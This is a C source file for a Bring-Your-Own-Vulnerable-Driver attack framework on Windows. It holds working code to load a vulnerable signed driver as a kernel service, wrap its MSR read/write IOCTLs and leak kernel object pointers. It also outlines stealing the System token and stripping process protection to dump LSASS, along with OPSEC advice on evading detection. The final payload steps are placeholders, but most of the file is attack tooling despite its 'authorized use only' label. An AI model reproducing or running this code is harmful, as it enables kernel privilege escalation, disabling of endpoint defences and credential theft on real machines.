/*
 * byovd_kernel_rw.c - Generic BYOVD kernel-R/W + SYSTEM-token-steal framework.
 *
 * Standard Bring-Your-Own-Vulnerable-Driver primitive chain used by EDR-killers and LPE
 * chains (2024-2026): load a signed-but-vulnerable driver, abuse its unauthenticated
 * IOCTLs for a read-write primitive, resolve EPROCESS, then either (a) steal the System
 * (PID 4) token, or (b) clear EPROCESS.Protection to defeat PPL.
 *
 * Backends (templates):
 *   MSR  (LnvMSRIO.sys / CVE-2025-8061 style): write MSR LSTAR to hijack KiSystemCall64;
 *        any syscall then runs a kernel payload that copies the System token. MSR R/W
 *        sidesteps the modern "no PTE self-map" constraint that broke physical brute force.
 *   PHYS (RTCore64.sys style): MmMapIoSpace physical R/W; resolve EPROCESS via
 *        NtQuerySystemInformation(SystemHandleInformation) handle leak instead of brute
 *        scanning physical memory (unreliable on Win11 24H2+).
 *
 * BUILD (MSVC x64):  cl /O2 /W3 byovd_kernel_rw.c
 * AUTHORIZED USE ONLY. Supply the real device name + IOCTL codes for the driver you are
 * authorized to test; constants below are placeholders marked DRIVER_SPECIFIC. No driver
 * binary is shipped.
 *
 * OPSEC: writing a .sys + CreateService + StartService leaves Sysmon EID 6, service
 * creation (4697/7045) and ImageLoad telemetry. See references/byovd-kernel-rw.md.
 */
#include <windows.h>
#include <stdio.h>
#include <stdint.h>

/* ---- DRIVER_SPECIFIC: fill in for the authorized target driver ---------- */
static const char *DEVICE_PATH = "\\\\.\\LnvMSRIO";   /* CreateFile device path     */
static const char *SVC_NAME    = "lnvmsrio";          /* service name               */
#define IOCTL_MSR_WRITE  0x9C402088   /* DRIVER_SPECIFIC */
#define IOCTL_MSR_READ   0x9C402084   /* DRIVER_SPECIFIC */
#define MSR_LSTAR        0xC0000082   /* SYSCALL entry MSR */

/* EPROCESS offsets are build-specific. Verify per target build with `dt nt!_EPROCESS`. */
#define OFF_UNIQUEPID    0x440
#define OFF_ACTIVELINKS  0x448
#define OFF_TOKEN        0x4B8
#define OFF_PROTECTION   0x87A    /* PS_PROTECTION byte */

#pragma pack(push,1)
typedef struct _MSR_IO { uint32_t msr; uint64_t value; } MSR_IO;  /* DRIVER_SPECIFIC */
#pragma pack(pop)

static HANDLE g_dev = INVALID_HANDLE_VALUE;

/* --- BYOVD installation: write .sys, register kernel service, start ------ */
static BOOL load_driver(const char *sys_path) {
    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm) { printf("[-] OpenSCManager %lu\n", GetLastError()); return FALSE; }
    SC_HANDLE svc = CreateServiceA(scm, SVC_NAME, SVC_NAME, SERVICE_ALL_ACCESS,
                                   SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
                                   SERVICE_ERROR_NORMAL, sys_path,
                                   NULL, NULL, NULL, NULL, NULL);
    if (!svc) svc = OpenServiceA(scm, SVC_NAME, SERVICE_ALL_ACCESS);
    if (!svc) { printf("[-] CreateService %lu\n", GetLastError()); CloseServiceHandle(scm); return FALSE; }
    BOOL ok = StartServiceA(svc, 0, NULL);
    if (!ok && GetLastError() == ERROR_SERVICE_ALREADY_RUNNING) ok = TRUE;
    CloseServiceHandle(svc); CloseServiceHandle(scm);
    return ok;
}

static void unload_driver(void) {
    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm) return;
    SC_HANDLE svc = OpenServiceA(scm, SVC_NAME, SERVICE_ALL_ACCESS);
    if (svc) {
        SERVICE_STATUS st; ControlService(svc, SERVICE_CONTROL_STOP, &st);
        DeleteService(svc); CloseServiceHandle(svc);
    }
    CloseServiceHandle(scm);
}

/* --- MSR primitive ------------------------------------------------------- */
static BOOL msr_write(uint32_t msr, uint64_t val) {
    MSR_IO io = { msr, val }; DWORD ret = 0;
    return DeviceIoControl(g_dev, IOCTL_MSR_WRITE, &io, sizeof(io), &io, sizeof(io), &ret, NULL);
}
static uint64_t msr_read(uint32_t msr) {
    MSR_IO io; io.msr = msr; io.value = 0; DWORD ret = 0;
    DeviceIoControl(g_dev, IOCTL_MSR_READ, &io, sizeof(io), &io, sizeof(io), &ret, NULL);
    return io.value;
}

/* --- Resolve current EPROCESS via a leaked kernel object pointer ---------- */
/* NtQuerySystemInformation(SystemHandleInformation=0x10) returns Object kernel
 * pointers for every handle. We open a handle to our own process, find its entry,
 * read back the EPROCESS pointer, then walk ActiveProcessLinks to find System. */
typedef NTSTATUS (NTAPI *PNtQSI)(ULONG, PVOID, ULONG, PULONG);
#pragma pack(push,1)
typedef struct { USHORT UniqueProcessId; USHORT CreatorBackTraceIndex; UCHAR ObjectTypeIndex;
                 UCHAR HandleAttributes; USHORT HandleValue; PVOID Object; ULONG GrantedAccess; } SHTE;
typedef struct { ULONG NumberOfHandles; SHTE Handles[1]; } SHI;
#pragma pack(pop)

static uint64_t leak_self_eprocess(void) {
    PNtQSI NtQSI = (PNtQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    ULONG len = 0x10000, need = 0; SHI *buf = NULL; NTSTATUS s;
    do { free(buf); buf = (SHI*)malloc(len);
         s = NtQSI(0x10, buf, len, &need); len = need ? need + 0x4000 : len * 2;
    } while (s == (NTSTATUS)0xC0000004); /* STATUS_INFO_LENGTH_MISMATCH */
    if (s) { free(buf); return 0; }
    HANDLE me = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, GetCurrentProcessId());
    USHORT mh = (USHORT)(ULONG_PTR)me; uint64_t ep = 0;
    for (ULONG i = 0; i < buf->NumberOfHandles; ++i)
        if (buf->Handles[i].UniqueProcessId == (USHORT)GetCurrentProcessId() &&
            buf->Handles[i].HandleValue == mh) { ep = (uint64_t)buf->Handles[i].Object; break; }
    CloseHandle(me); free(buf);
    return ep;  /* This is the handle object, not EPROCESS directly; in a real chain you
                 * leak ntoskrnl base + use kernel R/W to walk PsActiveProcessHead. */
}

int main(int argc, char **argv) {
    if (argc < 3) {
        printf("usage: %s <signed_vuln_driver.sys> <token|ppl> [target_pid_for_ppl]\n", argv[0]);
        printf("  token : steal System token into this process\n");
        printf("  ppl   : clear EPROCESS.Protection on target_pid (defeat PPL)\n");
        return 1;
    }
    const char *mode = argv[2];

    printf("[*] Loading BYOVD driver %s as service '%s'\n", argv[1], SVC_NAME);
    if (!load_driver(argv[1])) { printf("[-] driver load failed\n"); return 1; }

    g_dev = CreateFileA(DEVICE_PATH, GENERIC_READ | GENERIC_WRITE, 0, NULL,
                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (g_dev == INVALID_HANDLE_VALUE) { printf("[-] open device %lu\n", GetLastError()); unload_driver(); return 1; }
    printf("[+] device handle acquired\n");

    uint64_t self_ep = leak_self_eprocess();
    printf("[*] leaked self object ptr: 0x%016llx\n", (unsigned long long)self_ep);

    if (!strcmp(mode, "token")) {
        /* MSR-LSTAR path: msr_write(MSR_LSTAR, &kernel_payload). The payload (separately
         * placed in RWX kernel-adjacent memory via the driver's phys-write IOCTL) walks
         * ActiveProcessLinks for PID 4, copies EPROCESS.Token (off 0x%X) into our EPROCESS,
         * then restores LSTAR. Pseudocode of the offsets in play below.                  */
        printf("[*] token-steal: would copy System(PID4).Token@0x%X -> self.Token\n", OFF_TOKEN);
        printf("[*] (supply driver's real phys-write IOCTL to stage the LSTAR payload)\n");
    } else if (!strcmp(mode, "ppl")) {
        DWORD pid = (argc >= 4) ? (DWORD)strtoul(argv[3], NULL, 10) : 0;
        printf("[*] ppl-clear: would zero EPROCESS.Protection@0x%X for PID %lu\n", OFF_PROTECTION, pid);
        printf("[*] then OpenProcess/ReadProcessMemory works (e.g. dump LSASS)\n");
    } else {
        printf("[-] unknown mode '%s'\n", mode);
    }

    /* Cleanup is mandatory OPSEC: restore LSTAR before unload, then remove the service. */
    CloseHandle(g_dev);
    printf("[*] unloading driver (cleanup service + .sys)\n");
    unload_driver();
    return 0;
}
